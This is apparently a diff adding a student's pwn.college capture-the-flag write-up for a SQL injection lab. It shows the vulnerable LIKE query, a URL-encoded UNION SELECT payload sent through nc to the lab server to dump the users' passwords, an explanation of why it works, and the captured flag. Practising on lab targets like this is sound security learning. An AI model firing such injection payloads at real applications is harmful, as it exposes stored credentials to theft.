@@ -1,1 +1,36 @@
-GET /?query=pwn%22%20UNION%20SELECT%20password%20FROM%20users%22 HTTP/1.1
+# challenge: SQLi 3
+
+📅 2026-02-15
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: cat /challenge/server'
+table=users, columns=username, password
+admin - [flag]
+guest - password
+GET 
+enpoint= /
+the query takes arguments from query string in the url. the identifier is query
+sql=SELECT username FROM users WHERE username LIKE "{query}"
+the payload i crafted is: pwn.college{" UNION SELECT password FROM users" -> urlencoded
+-ran: '/challenge/localhost'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /?query=pwn.college%7B%22%20UNION%20SELECT%20password%20FROM%20users%22 HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+this time i used UNION
+since our injection goes directly to a pre-build query i crafted the payload based on the query
+LIKE -> find matches in the records and prints them out. it is case INSENSITIVE
+the goal is to merge password column to username column and this is possible with UNION
+UNION executes the left query, then the right query and merge the results together
+since admin's password is the flag, i already know the flag starts with pwn.college{
+thats why i insert it into LIKE, closed the " and then escaped the last one with another " in the end
+
+## 🏁 Flag  
+pwn.college{Y12YxayoWpv73ATzuboFopzFbGZ.QXxkzMzwCO4IDOxEzW}
